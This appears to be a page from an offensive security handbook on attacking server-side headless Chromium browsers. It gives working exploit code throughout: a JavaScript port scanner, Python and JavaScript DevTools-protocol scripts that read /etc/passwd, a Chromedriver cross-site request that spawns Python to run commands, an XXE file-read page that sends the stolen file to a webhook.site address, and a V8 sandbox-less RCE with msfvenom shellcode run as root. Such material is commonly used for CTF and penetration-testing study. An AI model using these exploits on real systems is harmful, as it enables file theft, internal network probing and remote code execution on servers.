---
description: >-
  Tricks for dealing with input into headless browsers on the server, using
  client-side methods
---

# Headless Browsers

When dealing with a headless browser, by far the most commonly used variant is Chromium. Automation libraries have the choice between [#chrome-devtools-protocol-cdp](headless-browsers.md#chrome-devtools-protocol-cdp "mention") and the W3C-standardized [#chromedriver](headless-browsers.md#chromedriver "mention") to send actions to the process, and your options really depend on which is used:

* **Chrome DevTools Protocol**: [Puppeteer](https://pptr.dev/), [Playwright](https://playwright.dev/)
* **Chromedriver**: [Selenium](https://selenium-python.readthedocs.io/)

Most of the attacks covered for these instrumentation tools involve some malicious code in the browser interacting with its open port to perform sensitive actions a website normally isn't able to do.

***

When running inside Docker, you should pass the `$DISPLAY` variable into it to get GUI access if you need it. Specifically when using [WSL](https://learn.microsoft.com/en-us/windows/wsl/install) with Docker for Desktop, you should also mount a few volumes. You can consistently do this using the following configuration and removing any `--headless` flags:

<pre class="language-yaml" data-title="docker-compose.yml"><code class="lang-yaml">services:
  web:
    build: .
    ports:
      - "1337:1337"
<strong>    volumes:
</strong><strong>      - /mnt/wslg:/mnt/wslg
</strong><strong>      - /tmp/.X11-unix:/tmp/.X11-unix
</strong><strong>    environment:
</strong><strong>      - DISPLAY=${DISPLAY}
</strong></code></pre>

## Differences

When a browser is being automated, it often has no visual GUI that comes up with _headless_ mode. In the background all the same rendering calculations still happen, so it can take screenshots and should work exactly the same as your regular browser. However, to make automation work better some small changes have been made to the security rules that can be exploited in certain scenarios.

***

Most importantly, all [features gated by User Activation](https://developer.mozilla.org/en-US/docs/Web/Security/User_activation) **don't need interaction**. This means functions like [**`window.open()`**](https://developer.mozilla.org/en-US/docs/Web/API/Window/open), which normally require a click, can be called how many times you want whenever you want. This is a very powerful primitive for attacks because cookies will be included in such top-level requests, and often the function is required for getting a reference to such pages.

Another more niche fact is that, strangely, [Cache Partitioning](https://developer.chrome.com/blog/http-cache-partitioning) is not enabled for automated browsers. This means the [#origin-with-credentials-cache](cross-site-request-forgery-csrf.md#origin-with-credentials-cache "mention") trick doesn't need an attacker-controlled subdomain, but instead can be achied through any origin. It also may help make some attacks involving [#browser-cache](caching.md#browser-cache "mention") easier because it can be triggered from the attacker's site.

Interacting with elements like through [`Page.click()`](https://pptr.dev/api/puppeteer.page.click) in Puppeteer work by locating the _position_ of the selected element, and clicking on the page in the center of that element. That means they are also vulnerable to **clickjacking** just like us humans, by positioning an iframe above the targeted button, you can make it click something inside the iframe.\
This idea also extends to the **keyboard**, if it tries to fill out some input with a text, it will type the string out including **spaces**. If it's not selected an input at all, but instead focused a button on some other page while typing, the space press may actually _press the button_!

## SSRF

The headless browser often runs on some server, which may also include more applications locally or in an internal network. You can try to use it as an SSRF by loading resources such as **iframes** or simply navigating to it. The protocol you may navigate to depends on the protocol you currently have, if your content is hosted on `http:` or `https:`, you can only go to one of those addresses.\
But if your content is hosted on a `file:` URL, you are allowed to `<iframe>` other files, such as:

```html
<iframe src="file:///etc/passwd" width="1000" height="1000">
```

In the rendered result you can then read the content of it. Browsers even automatically generate indexes for folders, so a path like `file:///app` could show you all the files inside `/app` for you to discover.

You can find more payloads to include files or interesting information in the article below. Know that some custom HTML renderers may parse/behave _differently from a real browser_ and thus require very carefully crafted payload with correct syntax.

{% embed url="https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html" %}
Collection of various server-side HTML rendering exploitation techniques
{% endembed %}

Apart from leaking data in the result, you can also interact with internal networks through the regular APIs like [`fetch()`](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API). A useful thing is to **scan for ports** using JavaScript, below is a simple implementation that tries to send an HTTP request to a large range of ports with throttling to keep the browser alive. You can configure the specific ports it scans (may be a lot, just takes a few seconds), and what to do with the results instead of logging to the console.

<pre class="language-javascript" data-title="Port Scanning"><code class="lang-javascript">function range(start, end) {
  return Array.apply(0, Array(end - start + 1)).map((element, index) => index + start);
}

<strong>const PORTS = range(1, 10000); // Can be a large range, or some specific subset
</strong><strong>const POOL_SIZE = 1000; // Parallel requests limit
</strong><strong>
</strong><strong>async function foundPort(port) {
</strong><strong>  console.log(`Port ${port} is open!`);
</strong><strong>}
</strong>
async function scanPort(port) {
  await fetch(`http://127.0.0.1:${port}`, { mode: "no-cors" })
    .then(() => foundPort(port))
    .catch((e) => e);

  return port;
}

const processInPool = async (ports, poolSize) => {
  let pool = {};

  for (const id of ports) {
    pool[id] = scanPort(id);

    if (Object.keys(pool).length > poolSize - 1) {
      const promises = Object.values(pool);
      const resolvedId = await Promise.race(promises); // wait for one Promise to finish
      delete pool[resolvedId]; // remove that Promise from the pool
    }
  }

  return await Promise.all(Object.values(pool));
};

processInPool(PORTS, POOL_SIZE).then(() => {
  console.log("Port scanning completed.");
});
</code></pre>

From here, you can try to attack the found ports through the browser, and if you find an XSS, possibly abuse what's explained in [#chromedriver](headless-browsers.md#chromedriver "mention").

You'll also often see these headless instances running in isolated docker containers. In this case you may be able to connect to other internal docker IPs in the `172.16.0.0/16` range.

## Chrome DevTools Protocol (CDP)

The [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/) is for **Remote Debugging** and is a popular choice for automation libraries too. It listens on port 9222 by default to receive commands with which malicious websites can interact somewhat.

### Endpoints

When `google-chrome` is launched with remote debugging enabled, this is usually on port 9222. But it can be changed with the `--remote-debugging-port=` argument when it is started.&#x20;

When this port is accessible, you can connect to it with the [DevTools HTTP Protocol](https://chromedevtools.github.io/devtools-protocol/#endpoints) in order to make the browser do certain things. You can debug the currently viewed site, meaning reading any data, like HTML, cookies, or other stored data, and execute JavaScript in the console. As well as being able to browse to and **read arbitrary files** on the system.&#x20;

Get a list of sessions by requesting `/json` endpoint:

{% code title="http://localhost:9222/json" %}
```json
[ {
  "description": "",
  "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:9222/devtools/page/DAB7FB6187B554E10B0BD18821265734",
  "id": "DAB7FB6187B554E10B0BD18821265734",
  "title": "Yahoo",
  "type": "page",
  "url": "https://www.yahoo.com/",
  "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/DAB7FB6187B554E10B0BD18821265734"
} ]
```
{% endcode %}

You can then visit the `devtoolsFrontendUrl` in your browser (if `--remote-allow-origins` explicitly allows it) to get a recognizable DevTools GUI that you would get when debugging any site. Here you can do anything DevTools would be able to, like executing JavaScript, reading storage, and browsing the site.

{% hint style="warning" %}
Previously it was possible due to [chrome issue 40090539](https://issuetracker.google.com/issues/40090539) to CSRF the `/json/new?url=` endpoint, but this has been **fixed** since 2022. Now, CORS denies such requests by malicious websites because a `PUT` method is required.

If you're able to execute code in the `localhost:9222` origin somehow, you can still use this to open other protocol's URL such as `chrome://` and `file:///etc/passwd`.
{% endhint %}

### WebSocket

Commands to chrome are sent through the `webSocketDebuggerUrl`, which you can also directly access to have more control, and not be limited by the GUI. One interesting way of abusing this is to first **navigate** to a `file://` URL ([`Page.navigate`](https://chromedevtools.github.io/devtools-protocol/tot/Page/#method-navigate)), and then request the HTML content of the page using JavaScript ([`Runtime.evaluate`](https://chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-evaluate)) to read arbitrary files.&#x20;

If you find this **port exposed** by a higher-privileged user on a shared system, for example, you can abuse it in Python like so:

```python
from time import sleep
import requests
import websocket
import json

def page_navigate(ws, url):
    payload = {
        "id": 1,
        "method": "Page.navigate",
        "params": {
            "url": url
        }
    }
    ws.send(json.dumps(payload))
    return json.loads(ws.recv())

def get_current_html(ws):
    payload = {
        "id": 2,
        "method": "Runtime.evaluate",
        "params": {
            "expression": "document.documentElement.outerHTML"
        }
    }
    ws.send(json.dumps(payload))
    return json.loads(ws.recv())["result"]["result"]["value"]

targets = requests.get("http://localhost:9222/json").json()
websocket_url = targets[0]["webSocketDebuggerUrl"]

ws = websocket.create_connection(websocket_url)
sleep(1)
print(page_navigate(ws, "file:///etc/passwd"))
sleep(3)
print(get_current_html(ws))
```

If you are somehow able to read the response to a `http://localhost:9222/json` request to get the `webSocketDebuggerUrl`, _and_ are allowed to connect to it by your origin inside the `--remote-allow-origins` argument, you can even send such commands using the common [WebSocket API](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API) from a malicious website:

<details>

<summary>CDP WebSocket implementation in JavaScript</summary>

<pre class="language-javascript"><code class="lang-javascript">function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

window.open(); // Open a new window if one doesn't already exist to navigate

(async () => {
  const targets = await fetch("http://localhost:9222/json").then((r) => r.json());
  const websocketUrl = targets[0].webSocketDebuggerUrl;
  // ^^ Or leak URL through any other means
  const ws = new WebSocket(websocketUrl);

  ws.onopen = async () => {
    ws.send(
      JSON.stringify({
        id: 1,
        method: "Page.navigate",
        params: {
          url: "file:///etc/passwd",
        },
      })
    );
    await sleep(1000);

    ws.send(
      JSON.stringify({
        id: 2,
        method: "Runtime.evaluate",
        params: {
          expression: "document.documentElement.outerHTML",
        },
      })
    );

    ws.onmessage = (event) => {
      const response = JSON.parse(event.data);
      if (response.id === 2) {
<strong>        console.log(response.result.result.value);
</strong>        ws.close();
      }
    };
  };
})();
</code></pre>

</details>

## Chromedriver

Chromedriver is another implementation of an instrumentation tool, which by default listens on a random port in the range defined by `/proc/sys/net/ipv4/ip_local_port_range` (32768-60999), often seen with a `--port` argument in the process list. It  implements the [W3C WebDriver spec](https://www.w3.org/TR/webdriver2/), which includes a [`POST /session`](https://www.w3.org/TR/webdriver2/#new-session) endpoint.

The vulnerability mentioned in "wont-fix" [issue 40052697](https://issuetracker.google.com/issues/40052697) is that this endpoint allows all `localhost` origins by default. There is no other CSRF protection, as the JSON body doesn't need a valid `Content-Type:` header. It becomes a [CORS Simple Request](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS#simple_requests), which you can send easily using `fetch()`.&#x20;

The requirement for this is either having **XSS on a localhost origin**, from there you can call this endpoint to spawn a new session with custom `binary` and `args` options that result in RCE:

<pre class="language-html" data-title="rce.html"><code class="lang-html">&#x3C;script>
  const options = {
    mode: "no-cors",
    method: "POST",
    body: JSON.stringify({
      capabilities: {
        alwaysMatch: {
          "goog:chromeOptions": {
            binary: "/usr/local/bin/python",
<strong>            args: ["-c", "__import__('os').system('id > /tmp/pwned')"],
</strong>          },
        },
      },
    }),
  };

  for (let port = 32768; port &#x3C; 61000; port++) {
    fetch(`http://127.0.0.1:${port}/session`, options);
  }
&#x3C;/script>
</code></pre>

If the above `for` loop completes on a localhost origin, you should have seen the command execute by finding the output of `id` inside `/tmp/pwned`.

## CVEs

The following sections describe older vulnerabilities in Chrome that were patched in some recent version, but the bot could still be outdated before any of the mentioned versions. These range from file reads to full on RCEs in some cases.

To easily start any version locally for testing, use the following Docker setup to download a specific major version or a specific one if you find it:

<pre class="language-docker" data-title="Dockerfile"><code class="lang-docker">FROM debian:bullseye-slim

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update &#x26;&#x26; \
    apt-get install -y wget curl jq unzip libnss3 libx11-6 libx11-xcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxi6 libxrandr2 libgbm1 libasound2 libgtk-3-0 &#x26;&#x26; \
    rm -rf /var/lib/apt/lists/*

<strong>ENV VERSION_CONSTRAINT='| startswith("127.")'
</strong># ENV VERSION_CONSTRAINT='=="127.0.6533.119"'

RUN wget -q $(curl -s https://googlechromelabs.github.io/chrome-for-testing/known-good-versions-with-downloads.json | \
    jq -r '[.versions[] | select(.version '"$VERSION_CONSTRAINT"')] | .[-1].downloads.chrome[] | select(.platform == "linux64") | .url') &#x26;&#x26; \
    unzip chrome-linux64.zip &#x26;&#x26; \
    mv chrome-linux64 /opt/chromium &#x26;&#x26; \
    ln -s /opt/chromium/chrome /usr/bin/chromium &#x26;&#x26; \
    rm chrome-linux64.zip

ENTRYPOINT ["chromium", "--no-sandbox", "--no-first-run"]
</code></pre>

From there, you can open up your exploit page to check if it would work against the real target.

### XXE (<= 115)

Researchers at Positive Security (or rather ChatGPT) discovered a logic issue where the XSLT parser could load arbitrary local files:

{% embed url="https://swarm.ptsecurity.com/xxe-chrome-safari-chatgpt/" %}
Writeup of the discovery of CVE-2023-4357
{% endembed %}

An easy test to check if the version is vulnerable by testing various files is provided at the bottom of their writeup. If your target gives you a screenshot or the content in any other way that's displayed in these iframes, you can already leak data visually.

To exploit it in a scenario where you have scripting but no visual response, you can use JavaScript to read the content raw and exfiltrate it to your server:

<pre class="language-html" data-title="xxe.html"><code class="lang-html">&#x3C;body>
  &#x3C;script>
<strong>    const FILENAME = "/etc/passwd";
</strong>
    const xxe = `&#x3C;?xml version="1.0" encoding="UTF-8"?>
&#x3C;!DOCTYPE xxe [ &#x3C;!ENTITY xxe SYSTEM "file://${FILENAME}"> ]>
&#x3C;xxe>
&#x26;xxe;
&#x3C;/xxe>`;
    const xls = `&#x3C;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:user="http://mycompany.com/mynamespace">
&#x3C;xsl:output method="xml"/>
&#x3C;xsl:template match="/">
&#x3C;svg xmlns="http://www.w3.org/2000/svg">
&#x3C;foreignObject width="300" height="600">
&#x3C;div xmlns="http://www.w3.org/1999/xhtml">
&#x3C;xsl:copy-of  select="document('data:,${encodeURIComponent(xxe)}')"/>
&#x3C;/div>
&#x3C;/foreignObject>
&#x3C;/svg>
&#x3C;/xsl:template>
&#x3C;/xsl:stylesheet>`;

    const blob = new Blob(
      [
        `&#x3C;?xml version="1.0" encoding="UTF-8"?>
    &#x3C;?xml-stylesheet type="text/xsl" href="data:text/xml;base64,${btoa(xls)}"?>
    &#x3C;!DOCTYPE svg [
        &#x3C;!ENTITY ent SYSTEM "?" NDATA aaa>
    ]>
    &#x3C;svg location="ent" />`,
      ],
      { type: "image/svg+xml" }
    );
    const url = URL.createObjectURL(blob);
    const w = window.open(url);
    const interval = setInterval(() => {
      if (w.document.readyState === "complete") {
        clearInterval(interval);
        const leak = w.document.querySelector("xxe").innerHTML;
        w.close();
<strong>        navigator.sendBeacon("https://webhook.site/...", leak);
</strong>      }
    }, 1000);
  &#x3C;/script>
&#x3C;/body>
</code></pre>

### JavaScript V8 without sandbox (<= 127)

[V8](https://v8.dev/) is the name of the JavaScript engine in Chromium, and because of its complexity and speed requirements, has had a lot of vulnerabilities involving memory corruption. The scripting nature of JavaScript makes these often easy to exploit because some primitives just need to be built in order to simply script out an attack as you normally would.

One fact that makes headless setups especially more vulnerable is their common use of `--no-sandbox`, because when running as `root` this option is required to make the browser work. You'll even often see this argument added when it's not strictly needed, just because it is so common.\
What you need to know is that it **disables the renderer sandbox**, essentially making any JavaScript that runs arbitrary instructions able to run shellcode on the system. Many exploits do this, but stop at the sandbox, perfect!

We just need to find a public chrome issue with a fully-written PoC, where you can often just substitute the built-in shellcode for anything you need.

{% embed url="https://jopraveen.github.io/web-hackthebot/" %}
Article explaining an unintended solution to an XSS challenge using a Chrome V8 exploit
{% endembed %}

The above writeup uses [Chromium issue 365802567](https://issues.chromium.org/issues/365802567) with a downloadable [HTML PoC](https://issues.chromium.org/action/issues/365802567/attachments/59303131?download=false). The code contains a `sc` variable standing for "shellcode", set to a Windows x86-64 `calc.exe` payload. We can change this easily for a Linux system, for example, by compiling new [shellcode.md](../../binary-exploitation/shellcode.md "mention"):

<pre class="language-shell-session" data-overflow="wrap"><code class="lang-shell-session"><strong>$ msfvenom -p linux/x64/exec CMD='id>/tmp/pwned' -f powershell
</strong>
[Byte[]] $buf = 0x48,0xb8,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x0,0x99,0x50,0x54,0x5f,0x52,0x66,0x68,0x2d,0x63,0x54,0x5e,0x52,0xe8,0xe,0x0,0x0,0x0,0x69,0x64,0x3e,0x2f,0x74,0x6d,0x70,0x2f,0x70,0x77,0x6e,0x65,0x64,0x0,0x56,0x57,0x54,0x5e,0x6a,0x3b,0x58,0xf,0x5
</code></pre>

The hex bytes can be copied into the array, replacing the original:

{% code title="rce.html" %}
```diff
- const sc = [0x48, 0x83, 0xe4, 0xf0, 0x55, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x2e, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8d, 0x15, 0xd7, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4c, 0x24, 0x20, 0xe8, 0x34, 0x00, 0x00, 0x00, 0xba, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0xc9, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x83, 0xc4, 0x28, 0x5d, 0x48, 0x89, 0xec, 0x5d, 0xc3, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x40, 0x20, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x40, 0x20, 0xc3, 0x53, 0x57, 0x56, 0x41, 0x50, 0x48, 0x89, 0x4c, 0x24, 0x28, 0x48, 0x89, 0x54, 0x24, 0x30, 0x8b, 0x59, 0x3c, 0x48, 0x01, 0xcb, 0x8b, 0x9b, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xcb, 0x44, 0x8b, 0x43, 0x18, 0x8b, 0x7b, 0x20, 0x48, 0x01, 0xcf, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xc0, 0x4c, 0x39, 0xc6, 0x73, 0x43, 0x8b, 0x0c, 0xb7, 0x48, 0x03, 0x4c, 0x24, 0x28, 0x48, 0x8b, 0x54, 0x24, 0x30, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x33, 0x00, 0x00, 0x00, 0x48, 0x83, 0xc4, 0x28, 0x48, 0x85, 0xc0, 0x74, 0x08, 0x48, 0x31, 0xc0, 0x48, 0xff, 0xc6, 0xeb, 0xd4, 0x48, 0x8b, 0x4c, 0x24, 0x28, 0x8b, 0x7b, 0x24, 0x48, 0x01, 0xcf, 0x48, 0x0f, 0xb7, 0x34, 0x77, 0x8b, 0x7b, 0x1c, 0x48, 0x01, 0xcf, 0x8b, 0x04, 0xb7, 0x48, 0x01, 0xc8, 0x41, 0x58, 0x5e, 0x5f, 0x5b, 0xc3, 0x53, 0x8a, 0x01, 0x8a, 0x1a, 0x84, 0xc0, 0x74, 0x0c, 0x38, 0xd8, 0x75, 0x08, 0x48, 0xff, 0xc1, 0x48, 0xff, 0xc2, 0xeb, 0xec, 0x28, 0xd8, 0x48, 0x0f, 0xbe, 0xc0, 0x5b, 0xc3, 0x57, 0x69, 0x6e, 0x45, 0x78, 0x65, 0x63, 0x00];
- const cmd = 'calc';
- for (let i = 0; i < cmd.length; i++) {
-   sc.push(cmd.charCodeAt(i));
- }
+ const sc = [0x48,0xb8,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x0,0x99,0x50,0x54,0x5f,0x52,0x66,0x68,0x2d,0x63,0x54,0x5e,0x52,0xe8,0xe,0x0,0x0,0x0,0x69,0x64,0x3e,0x2f,0x74,0x6d,0x70,0x2f,0x70,0x77,0x6e,0x65,0x64,0x0,0x56,0x57,0x54,0x5e,0x6a,0x3b,0x58,0xf,0x5];
```
{% endcode %}

All that's left to do now is host it, and let the bot visit the page with malicious JavaScript. This should write the output of `id` to `/tmp/pwned`:

```shell-session
$ docker compose exec -it web cat /tmp/pwned
uid=0(root) gid=0(root) groups=0(root)
```

{% hint style="warning" %}
**Note**: from testing, on some _kernels_ this proof of concept doesn't seem to work, and segfault into something involving `SEGV_PKUERR`. I'm not sure why this happens, but if you encounter such a case you may have to try a different issue with a proof of concept.
{% endhint %}
